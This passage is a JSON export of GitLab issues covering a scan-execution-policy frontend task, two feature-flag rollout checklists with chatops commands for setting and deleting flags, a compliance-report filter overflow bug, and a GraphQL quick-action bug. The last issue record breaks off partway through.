[{"id":106843054,"iid":359884,"project_id":278964,"title":"FE: Show Name/Description/Enabled/Preview components","description":"\u003c!--\nImplementation issues are used break-up a large piece of work into small, discrete tasks that can\nmove independently through the build workflow steps. They're typically used to populate a Feature\nEpic. Once created, an implementation issue is usually refined in order to populate and review the\nimplementation plan and weight.\nExample workflow: https://about.gitlab.com/handbook/engineering/development/threat-management/planning/diagram.html#plan\n--\u003e\n\n## Why are we doing this work\n- Users want to use a Rule mode to create a scan execution policy because yaml can be hard to parse\n\n## Relevant links\n![image](/uploads/d0991bdfecdb3dd3a1518d003a115fe1/image.png)\n\n\n## Non-functional requirements\n- [ ] Feature flag:\n- [ ] Testing:\n\n## Implementation plan\n- [ ] ~frontend abstract out name/description/enabled fields from `scan_result_policy_editor.vue` and put them in `policy_editor_layout.vue` to be reused by `scan_execution_policy_editor.vue`\n- [ ] ~frontend create `scan_execution_rule-mode` feature flag\n\n## Verification steps\n1. Navigate to a project with a ~\"GitLab Ultimate\" license and that has the `:scan_execution_rule_mode` feature flag turned on\n1. Navigate to `Security \u0026 Compliance` =\u003e `Policies` =\u003e `New policy` =\u003e `Scan Execution Policy`\n1. Verify rule mode works","state":"closed","created_at":"2022-04-19T15:44:52.938Z","updated_at":"2022-06-27T03:41:07.598Z","closed_at":"2022-06-21T04:01:15.097Z","closed_by":{"id":5537154,"username":"aturinske","name":"Alexander Turinske","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5537154/avatar.png","web_url":"https://gitlab.com/aturinske"},"labels":["[deprecated] Accepting merge requests","devops::govern","frontend","frontend-weight::3","group::security policies","section::sec","type::feature","workflow::ready for development"],"milestone":{"id":2453024,"iid":74,"group_id":9970,"title":"15.2","description":"","state":"active","created_at":"2022-02-03T22:24:46.818Z","updated_at":"2022-02-03T22:26:32.010Z","due_date":"2022-07-17","start_date":"2022-06-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/74"},"assignees":[],"author":{"id":5537154,"username":"aturinske","name":"Alexander Turinske","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5537154/avatar.png","web_url":"https://gitlab.com/aturinske"},"type":"ISSUE","assignee":null,"user_notes_count":1,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/359884","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":4,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 4 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/359884","notes":"https://gitlab.com/api/v4/projects/278964/issues/359884/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/359884/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#359884","relative":"#359884","full":"gitlab-org/gitlab#359884"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":5363,"epic":{"id":198785,"iid":5363,"title":"Allow Users to Edit Rule-mode Scan Execution Policies in the Policy UI","url":"/groups/gitlab-org/-/epics/5363","group_id":9970,"human_readable_end_date":"Dec 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":106842850,"iid":359883,"project_id":278964,"title":"[Feature flag] Cleanup scan_execution_rule_mode","description":"\u003c!-- Title suggestion: [Feature flag] Enable description of feature --\u003e\n\n## Summary\n\nThis issue is to rollout [scan execution poilcy rule mode](https://gitlab.com/groups/gitlab-org/-/epics/5363) on production,\nthat is currently behind the `scan_execution_rule-mode` feature flag.\n\n\u003c!-- Short description of what the feature is about and link to relevant other issues. --\u003e\n\n## Owners\n\n- Team: Protect::Container Security\n- Most appropriate slack channel to reach out to: `#s_protect_container_security`\n- Best individual to reach out to: @aturinske \n- PM: @sam.white \n\n## Expectations\n\n### What are we expecting to happen?\n\nThe user can create scan execution policies via a rule mode\n\n### When is the feature viable?\n\n~\"GitLab Ultimate\" \n\n### What might happen if this goes wrong?\n\nA user will not be able to create scan execution policies at all\n\n### What can we monitor to detect problems with this?\n\nCheck customer complaints\n\n### What can we check for monitoring production after rollouts?\n\nCheck customer complaints\n\n## Rollout Steps\n\n### Rollout on non-production environments\n\n- Ensure that the feature MRs have been deployed to non-production environments.\n    - [x] `/chatops run auto_deploy status de3454a34defdc123807eac9800cf9c7b9a87222`\n- [ ] Enable the feature globally on non-production environments.\n    - [ ] `/chatops run feature set scan_execution_rule_mode true --dev`\n    - [x] `/chatops run feature set --project=defend-team-test/operational-vulnerabilities/cluster-image-scanning scan_execution_rule_mode true --staging`\n    - [x] `/chatops run feature set scan_execution_rule_mode true --staging`\n- [ ] Verify that the feature works as expected. Posting the QA result in this issue is preferable.\n      The best environment to validate the feature in is [staging-canary](https://about.gitlab.com/handbook/engineering/infrastructure/environments/#staging-canary)\n      as this is the first environment deployed to. Note you will need to make sure you are configured to use canary as outlined [here](https://about.gitlab.com/handbook/engineering/infrastructure/environments/canary-stage/)\n      when accessing the staging environment in order to make sure you are testing appropriately.\n\n### Specific rollout on production\n\n- Ensure that the feature MRs have been deployed to both production and canary.\n    - [x] `/chatops run auto_deploy status \u003cmerge-commit-of-your-feature\u003e`\n- If you're using [project-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [x] `/chatops run feature set --project=gitlab-org/protect/demos/sandbox scan_execution_rule_mode true`\n    - [x] `/chatops run feature set --project=gitlab-org/gitlab scan_execution_rule_mode true`\n- [x] Verify that the feature works on the specific entries. Posting the QA result in this issue is preferable.\n\n### Preparation before global rollout\n\n- [x] Check if the feature flag change needs to be accompanied with a\n  [change management issue](https://about.gitlab.com/handbook/engineering/infrastructure/change-management/#feature-flags-and-the-change-management-process).\n  Cross link the issue here if it does.\n- [x] Ensure that you or a representative in development can be available for at least 2 hours after feature flag updates in production.\n  If a different developer will be covering, or an exception is needed, please inform the oncall SRE by using the `@sre-oncall` Slack alias.\n- [ ] Ensure that documentation has been updated ([More info](https://docs.gitlab.com/ee/development/documentation/feature_flags.html#features-that-became-enabled-by-default)).\n- [x] Announce on [the feature issue](ISSUE LINK) an estimated time this will be enabled on GitLab.com. \n- [x] Ensure that any breaking changes have been announced following the [release post process](https://about.gitlab.com/handbook/marketing/blog/release-posts/#deprecations-removals-and-breaking-changes) to ensure GitLab customers are aware.\n- [x] Notify `#support_gitlab-com` and your team channel ([more guidance when this is necessary in the dev docs](https://docs.gitlab.com/ee/development/feature_flags/controls.html#communicate-the-change)).\n\n### Global rollout on production\n\nFor visibility, all `/chatops` commands that target production should be executed in the `#production` slack channel and cross-posted (with the command results) to the responsible team's slack channel (`#g_TEAM_NAME`).\n\n- [x] Announce on [the feature issue](ISSUE LINK) that the feature has been globally enabled.\n- [x] Wait for [at least one day for the verification term](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release).\n\n### (Optional) Release the feature with the feature flag\n\nIf you're still unsure whether the feature is [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release)\nbut want to release it in the current milestone, you can change the default state of the feature flag to be enabled.\nTo do so, follow these steps:\n\n- [x] Create a merge request with the following changes. Ask for review and merge it.\n    - [x] Set the `default_enabled` attribute in [the feature flag definition](https://docs.gitlab.com/ee/development/feature_flags/#feature-flag-definition-and-validation) to `true`.\n    - [x] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [x] Ensure that the default-enabling MR has been included in the release package.\n      If the merge request was deployed before [the monthly release was tagged](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [x] `/chatops run release check https://gitlab.com/gitlab-org/gitlab/-/merge_requests/99298 15.5`-\n- [x] Consider cleaning up the feature flag from all environments by running these chatops command in `#production` channel. Otherwise these settings may override the default enabled.\n  - [x] `/chatops run feature delete scan_execution_rule_mode --dev --staging --production`\n- [x] Close [the feature issue](https://gitlab.com/groups/gitlab-org/-/epics/5363) to indicate the feature will be released in the current milestone.\n- [x] Set the next milestone to this rollout issue for scheduling [the flag removal](#release-the-feature).\n- [x] (Optional) You can [create a separate issue](https://gitlab.com/gitlab-org/gitlab/-/issues/new?issuable_template=Feature%20Flag%20Cleanup) for scheduling the steps below to [Release the feature](#release-the-feature).\n    - [x] Set the title to \"[Feature flag] Cleanup `scan_execution_rule_mode`\".\n    - [ ] Execute the `/copy_metadata \u003cthis-rollout-issue-link\u003e` quick action to copy the labels from this rollout issue.\n    - [ ] Link this rollout issue as a related issue.\n    - [ ] Close this rollout issue.\n\n**WARNING:** This approach has the downside that it makes it difficult for us to\n[clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up) the flag.\nFor example, on-premise users could disable the feature on their GitLab instance. But when you\nremove the flag at some point, they suddenly see the feature as enabled and they can't roll it back\nto the previous behavior. To avoid this potential breaking change, use this approach only for urgent\nmatters.\n\n### Release the feature\n\nAfter the feature has been [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release),\nthe [clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up)\nshould be done as soon as possible to permanently enable the feature and reduce complexity in the\ncodebase.\n\nYou can either [create a follow-up issue for Feature Flag Cleanup](https://gitlab.com/gitlab-org/gitlab/-/issues/new?issuable_template=Feature%20Flag%20Cleanup) or use the checklist below in this same issue.\n\n\u003c!-- The checklist here is to help stakeholders keep track of the feature flag status --\u003e\n- [x] Create a merge request to remove `scan_execution_rule_mode` feature flag. Ask for review and merge it.\n    - [x] Remove all references to the feature flag from the codebase.\n    - [x] Remove the YAML definitions for the feature from the repository.\n    - [x] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [ ] Ensure that the cleanup MR has been included in the release package.\n      If the merge request was deployed before [the monthly release was tagged](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [ ] `/chatops run release check \u003cmerge-request-url\u003e \u003cmilestone\u003e`\n- [ ] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [x] Clean up the feature flag from all environments by running these chatops command in `#production` channel:\n    - [ ] `/chatops run feature delete scan_execution_rule_mode --dev`\n    - [ ] `/chatops run feature delete scan_execution_rule_mode --staging`\n    - [ ] `/chatops run feature delete scan_execution_rule_mode`\n- [x] Close this rollout issue.\n\n## Rollback Steps\n\n- [ ] This feature can be disabled by running the following Chatops command:\n\n```\n/chatops run feature set scan_execution_rule_mode false\n```","state":"closed","created_at":"2022-04-19T15:43:27.259Z","updated_at":"2022-12-21T12:09:32.946Z","closed_at":"2022-11-24T08:28:03.210Z","closed_by":{"id":5537154,"username":"aturinske","name":"Alexander Turinske","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5537154/avatar.png","web_url":"https://gitlab.com/aturinske"},"labels":["Category:Security Policy Management","Deliverable","customer","devops::govern","feature flag","feature::addition","frontend","group::security policies","section::sec","type::feature","workflow::verification"],"milestone":{"id":2717597,"iid":82,"group_id":9970,"title":"15.7","description":"","state":"active","created_at":"2022-07-29T14:48:31.199Z","updated_at":"2022-07-29T14:48:31.199Z","due_date":"2022-12-17","start_date":"2022-11-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/82"},"assignees":[{"id":5537154,"username":"aturinske","name":"Alexander Turinske","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5537154/avatar.png","web_url":"https://gitlab.com/aturinske"}],"author":{"id":5537154,"username":"aturinske","name":"Alexander Turinske","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5537154/avatar.png","web_url":"https://gitlab.com/aturinske"},"type":"ISSUE","assignee":{"id":5537154,"username":"aturinske","name":"Alexander Turinske","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5537154/avatar.png","web_url":"https://gitlab.com/aturinske"},"user_notes_count":5,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/359883","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":45,"completed_count":31},"weight":2,"blocking_issues_count":0,"has_tasks":true,"task_status":"31 of 45 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/359883","notes":"https://gitlab.com/api/v4/projects/278964/issues/359883/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/359883/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#359883","relative":"#359883","full":"gitlab-org/gitlab#359883"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":5363,"epic":{"id":198785,"iid":5363,"title":"Allow Users to Edit Rule-mode Scan Execution Policies in the Policy UI","url":"/groups/gitlab-org/-/epics/5363","group_id":9970,"human_readable_end_date":"Dec 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":106823609,"iid":359852,"project_id":278964,"title":"[Feature flag] Rollout of `container_registry_project_statistics`","description":"\u003c!-- Title suggestion: [Feature flag] Enable description of feature --\u003e\n\n## Summary\n\nThis issue is to rollout [persisting container registry size](https://gitlab.com/gitlab-org/gitlab/-/issues/354480) on production,\nthat is currently behind the `container_registry_project_statistics` feature flag.\n\n\u003c!-- Short description of what the feature is about and link to relevant other issues. --\u003e\nThe feature persists and updates the `ProjectStatistics#container_registry_size` column to help us to display this information to our customers.\n\nUpdates to the column happen as a result of `ContainerRegistry::Events` for pushing or deleting images (via the `container_registry_event` REST API endpoint).\n\nThe feature is feature flagged because the value for the column comes from the Container Registry API which we wanted to be careful about accidentally DoSing as a result of this feature.\n\n## Owners\n\n- Team: Utilization\n- Most appropriate slack channel to reach out to: `#g_utilization`\n- Best individual to reach out to: `@vij` (fallbacks: `@csouthard` / `@jdrpereira`)\n- PM: `@doniquesmit` \n\n## Stakeholders\n\n- #f_container_registry\n- `@trizzi`\n\n## Expectations\n\n### What are we expecting to happen?\n\nWhen enabled for a project, pushes or deletes of a container registry image tag will trigger an update to the corresponding `ProjectStatistics#container_registry_size`, which means 3 things will happen which did not before:\n\n1. Additional `ProjectCacheWorker` jobs will be enqueued with args `:container_registry_size`\n2. Additional Container Registry API requests will be made with the param `?self_and_descendants=true`\n3. `project_statistics` table will be updated with a value in `container_registry_size`\n\n\u003c!-- Describe the expected outcome when rolling out this feature --\u003e\n\n### When is the feature viable?\n\n\u003c!-- What are the settings we need to configure in order to have this feature viable? --\u003e\n\n\u003c!-- \nExample below:\n \n1. Enable service ping collection\n   `ApplicationSetting.first.update(usage_ping_enabled: true)`\n--\u003e\n\n### What might happen if this goes wrong?\n\nThe Container Registry API maybe inundated with requests causing outages of that API. We can immediately turn off the feature flag with no critical repurcussions. At most we may show outdated information to customers for the container registry size, but at the time of writing we don't currently expose this data to customers yet, weonly use it internally.\n\n### What can we monitor to detect problems with this?\n\n- `ProjectCacheWorker` for `container_registry_size` updates via kibana logs, https://log.gprd.gitlab.net/goto/87388810-da84-11ec-aade-19e9974a7229\n- Container Registry API monitoring via kibana logs, https://log.gprd.gitlab.net/goto/04376ed0-c48c-11ec-b73f-692cc1ae8214\n\n### What can we check for monitoring production after rollouts?\n\nAs above and also:\n\n- Container Registry Grafana dashboard: https://dashboards.gitlab.net/d/registry-main/registry-overview?orgId=1\n- Sidekiq Grafana dashboard: https://dashboards.gitlab.net/d/redis-sidekiq-main/redis-sidekiq-overview?orgId=1 \n\n## Rollout Steps\n\n### Rollout on non-production environments\n\n- Ensure that the feature MRs have been deployed to non-production environments.\n    - [x] `/chatops run auto_deploy status \u003cmerge-commit-of-your-feature\u003e`\n- [ ] Enable the feature globally on non-production environments.\n    - [ ] `/chatops run feature set \u003cfeature-flag-name\u003e true --dev`\n    - [ ] `/chatops run feature set \u003cfeature-flag-name\u003e true --staging`\n- [ ] Verify that the feature works as expected. Posting the QA result in this issue is preferable.\n      The best environment to validate the feature in is [staging-canary](https://about.gitlab.com/handbook/engineering/infrastructure/environments/#staging-canary)\n      as this is the first environment deployed to. Note you will need to make sure you are configured to use canary as outlined [here](https://about.gitlab.com/handbook/engineering/infrastructure/environments/canary-stage/)\n      when accessing the staging environment in order to make sure you are testing appropriately.\n\n### Specific rollout on production\n\n- Ensure that the feature MRs have been deployed to both production and canary.\n    - [x] `/chatops run auto_deploy status \u003cmerge-commit-of-your-feature\u003e`\n- If you're using [project-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [x] `/chatops run feature set --project=gitlab-org/gitlab container_registry_project_statistics true`\n    - [ ] `/chatops run feature set --project=gitlab-org/gitlab-foss container_registry_project_statistics true`\n    - [ ] `/chatops run feature set --project=gitlab-com/www-gitlab-com container_registry_project_statistics true`\n- [ ] Verify that the feature works on the specific entries. Posting the QA result in this issue is preferable.\n\n### Preparation before global rollout\n\n- [x] Check if the feature flag change needs to be accompanied with a\n  [change management issue](https://about.gitlab.com/handbook/engineering/infrastructure/change-management/#feature-flags-and-the-change-management-process).\n  Cross link the issue here if it does.\n- [x] Ensure that you or a representative in development can be available for at least 2 hours after feature flag updates in production.\n  If a different developer will be covering, or an exception is needed, please inform the oncall SRE by using the `@sre-oncall` Slack alias.\n- [x] Ensure that documentation has been updated ([More info](https://docs.gitlab.com/ee/development/documentation/feature_flags.html#features-that-became-enabled-by-default)).\n- [x] Announce on [the feature issue](ISSUE LINK) an estimated time this will be enabled on GitLab.com. \n- [ ] Ensure that any breaking changes have been announced following the [release post process](https://about.gitlab.com/handbook/marketing/blog/release-posts/#deprecations-removals-and-breaking-changes) to ensure GitLab customers are aware.\n- [ ] Notify `#support_gitlab-com` and your team channel ([more guidance when this is necessary in the dev docs](https://docs.gitlab.com/ee/development/feature_flags/controls.html#communicate-the-change)).\n\n### Global rollout on production\n\nFor visibility, all `/chatops` commands that target production should be executed in the `#production` slack channel and cross-posted (with the command results) to the responsible team's slack channel (`#g_TEAM_NAME`).\n\n- [x] [Incrementally roll out](https://docs.gitlab.com/ee/development/feature_flags/controls.html#process) the feature.\n  - If the feature flag in code has [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform **actor-based** rollout.\n    - [x] `/chatops run feature set container_registry_project_statistics \u003crollout-percentage\u003e --actors`\n  - Enable the feature globally on production environment.\n    - [ ] `/chatops run feature set \u003cfeature-flag-name\u003e true`\n- [ ] Announce on [the feature issue](ISSUE LINK) that the feature has been globally enabled.\n- [ ] Wait for [at least one day for the verification term](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release).\n\n\n### Release the feature\n\nAfter the feature has been [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release),\nthe [clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up)\nshould be done as soon as possible to permanently enable the feature and reduce complexity in the\ncodebase.\n\nYou can either [create a follow-up issue for Feature Flag Cleanup](https://gitlab.com/gitlab-org/gitlab/-/issues/new?issuable_template=Feature%20Flag%20Cleanup) or use the checklist below in this same issue.\n\n\u003c!-- The checklist here is to help stakeholders keep track of the feature flag status --\u003e\n- [ ] Create a merge request to remove `container_registry_project_statistics` feature flag. Ask for review and merge it.\n    - [ ] Remove all references to the feature flag from the codebase.\n    - [ ] Remove the YAML definitions for the feature from the repository.\n    - [ ] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [ ] Ensure that the cleanup MR has been included in the release package.\n      If the merge request was deployed before [the monthly release was tagged](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [ ] `/chatops run release check \u003cmerge-request-url\u003e \u003cmilestone\u003e`\n- [ ] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [ ] Clean up the feature flag from all environments by running these chatops command in `#production` channel:\n    - [ ] `/chatops run feature delete container_registry_project_statistics --dev`\n    - [x] `/chatops run feature delete container_registry_project_statistics --staging`\n    - [x] `/chatops run feature delete container_registry_project_statistics`\n- [ ] Close this rollout issue.\n\n## Rollback Steps\n\n- [ ] This feature can be disabled by running the following Chatops command:\n\n```\n/chatops run feature set container_registry_project_statistics false\n```","state":"closed","created_at":"2022-04-19T10:13:07.930Z","updated_at":"2022-08-24T06:15:04.775Z","closed_at":"2022-06-20T09:11:03.352Z","closed_by":{"id":5249152,"username":"vij","name":"Vijay Hawoldar","state":"active","avatar_url":"https://secure.gravatar.com/avatar/14567a8b4af4374011c43778878de399?s=80\u0026d=identicon","web_url":"https://gitlab.com/vij"},"labels":["[deprecated] Category:Utilization","backend","devops::fulfillment","feature flag","feature::addition","group::utilization","missed:15.0","section::fulfillment","type::feature","workflow::production"],"milestone":{"id":2453022,"iid":73,"group_id":9970,"title":"15.1","description":"","state":"active","created_at":"2022-02-03T22:23:29.335Z","updated_at":"2022-02-03T22:23:29.335Z","due_date":"2022-06-17","start_date":"2022-05-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/73"},"assignees":[{"id":5249152,"username":"vij","name":"Vijay Hawoldar","state":"active","avatar_url":"https://secure.gravatar.com/avatar/14567a8b4af4374011c43778878de399?s=80\u0026d=identicon","web_url":"https://gitlab.com/vij"}],"author":{"id":5249152,"username":"vij","name":"Vijay Hawoldar","state":"active","avatar_url":"https://secure.gravatar.com/avatar/14567a8b4af4374011c43778878de399?s=80\u0026d=identicon","web_url":"https://gitlab.com/vij"},"type":"ISSUE","assignee":{"id":5249152,"username":"vij","name":"Vijay Hawoldar","state":"active","avatar_url":"https://secure.gravatar.com/avatar/14567a8b4af4374011c43778878de399?s=80\u0026d=identicon","web_url":"https://gitlab.com/vij"},"user_notes_count":49,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/359852","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":34,"completed_count":11},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"11 of 34 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/359852","notes":"https://gitlab.com/api/v4/projects/278964/issues/359852/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/359852/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#359852","relative":"#359852","full":"gitlab-org/gitlab#359852"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":106817482,"iid":359845,"project_id":278964,"title":"[Bug] Compliance report project filter overflows on long names","description":"## Problem to solve\n\nThe project filter on the compliance report overflows when a project with a long name is selected as pointed out in https://gitlab.com/gitlab-org/gitlab/-/merge_requests/83964#note_910560352.\n\n## Screenshots\n\n![2022-04-12_23.44.02](https://gitlab.com/gitlab-org/gitlab/uploads/983938fe174b8507ddb243881181ba45/2022-04-12_23.44.02.gif)\n\n## How to recreate the bug\n\n1. View the group compliance report.\n2. Click on the project filter dropdown and select a project with a long name.\n\nOr view this filter on [staging.gitlab.com](https://staging.gitlab.com/groups/compliance-tanuki/-/security/compliance_dashboard?mergedAfter=2022-03-20\u0026mergedBefore=2022-04-19\u0026projectIds[]=5970699) (internal link).\n\n## Suggested solution\n\nUpdate the dropdown so that it respects the max with of 11rem on large viewports.","state":"closed","created_at":"2022-04-19T08:35:09.196Z","updated_at":"2022-04-25T07:50:22.687Z","closed_at":"2022-04-25T07:50:22.656Z","closed_by":{"id":3468028,"username":"jiaan","name":"Jiaan Louw","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3468028/avatar.png","web_url":"https://gitlab.com/jiaan"},"labels":["Enterprise Edition","GitLab Ultimate","devops::manage","frontend","group::compliance","priority::2","section::dev","severity::4","type::bug","workflow::scheduling"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[{"id":3468028,"username":"jiaan","name":"Jiaan Louw","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3468028/avatar.png","web_url":"https://gitlab.com/jiaan"}],"author":{"id":3468028,"username":"jiaan","name":"Jiaan Louw","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3468028/avatar.png","web_url":"https://gitlab.com/jiaan"},"type":"ISSUE","assignee":{"id":3468028,"username":"jiaan","name":"Jiaan Louw","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3468028/avatar.png","web_url":"https://gitlab.com/jiaan"},"user_notes_count":3,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/359845","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/359845","notes":"https://gitlab.com/api/v4/projects/278964/issues/359845/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/359845/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#359845","relative":"#359845","full":"gitlab-org/gitlab#359845"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6870,"epic":{"id":364935,"iid":6870,"title":"Compliance report merge request violations frontend MVP","url":"/groups/gitlab-org/-/epics/6870","group_id":9970,"human_readable_end_date":"May 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":106816840,"iid":359844,"project_id":278964,"title":"createDiffNote GraphQL mutation should use the CreateDiffNoteInput.position.headSha for /merge quick action","description":"In the epic https://gitlab.com/groups/gitlab-org/-/epics/7648 we explain how `/merge` quick action wasn't supported for `createNote` mutation.\n\nThe reason was that the merge logic expects us to submit `merge_request_head_diff_sha`. This attribute serves optimistic locking. If we try to merge, but we don't have the latest HEAD_SHA, the quick action will fail.\n\nThe related `createDiffNote` now fails with this error:\n\n```\n{\n  \"createDiffNote\": {\n    \"errors\":[\"Commands only The `/merge` quick action requires the SHA of the head of the branch.\"],\n    \"note\":null\n  }\n}\n```\n\nThe `createDiffNote` mutation takes `CreateDiffNoteInput`. This input contains `DiffPositionInput` which contains the `headSha` parameter.\n\nThe quick action logic should be able to use this `headSha` and not require any changes to the `createDiffNote` mutation interface.","state":"closed","created_at":"2022-04-19T08:23:01.812Z","updated_at":"2022-08-21T12:01:24.810Z","closed_at":"2022-07-21T01:39:24.952Z","closed_by":{"id":4901936,"username":"dskim_gitlab","name":"Sincheol (David) Kim","state":"active","avatar_url":"https://secure.gravatar.com/avatar/84a984a56c54d1d31338678421cecc32?s=80\u0026d=identicon","web_url":"https://gitlab.com/dskim_gitlab"},"labels":["Deliverable","GraphQL","api","backend","devops::create","group::code review","missed-deliverable","missed:15.2","section::dev","type::bug","workflow::in dev"],"milestone":{"id":2453025,"iid":75,"group_id":9970,"title":"15.3","description":"","state":"active","created_at":"2022-02-03T22:28:50.229Z","updated_at":"2022-02-03T22:28:50.229Z","due_date":"2022-08-17","start_date":"2022-07-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/75"},"assignees":[{"id":4901936,"username":"dskim_gitlab","name":"Sincheol (David) Kim","state":"active","avatar_url":"https://secure.gravatar.com/avatar/84a984a56c54d1d31338678421cecc32?s=80\u0026d=identicon","web_url":"https://gitlab.com/dskim_gitlab"}],"author":{"id":3457201,"username":"viktomas","name":"Tomas Vik","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3457201/avatar.png","web_url":"https://gitlab.com/viktomas"},"type":"ISSUE","assignee":{"id":4901936,"username":"dskim_gitlab","name":"Sincheol (David) 